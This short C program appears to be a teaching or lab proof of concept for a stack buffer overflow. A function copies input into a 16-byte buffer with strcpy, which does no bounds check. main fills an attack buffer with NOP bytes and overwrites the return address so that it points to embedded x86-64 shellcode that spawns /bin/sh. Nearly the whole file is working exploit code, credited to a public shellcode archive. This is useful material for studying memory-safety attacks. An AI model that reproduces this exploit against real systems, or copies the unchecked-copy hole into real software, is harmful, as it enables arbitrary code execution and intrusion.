#include <string.h>
#include <stdint.h>

#define BUF_SZ 16
#define NOOP_OPCODE 0x90

void foo(char *str) {
    char buf[BUF_SZ];
    strcpy(buf, str);
}

int main() {
    // shellcode from http://shell-storm.org/shellcode/files/shellcode-806.php
    char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91"
                       "\xd0\x8c\x97\xff\x48\xf7\xdb\x53"
                       "\x54\x5f\x99\x52\x57\x54\x5e\xb0"
                       "\x3b\x0f\x05";

    char attack_buf[BUF_SZ + 8 + 8];
    uint64_t shellcode_addr = (uint64_t) shellcode;
    memset(attack_buf, NOOP_OPCODE, BUF_SZ + 8);
    memcpy(&attack_buf[16 + 8], &shellcode_addr, 8);

    foo(attack_buf);

    return 0;
}

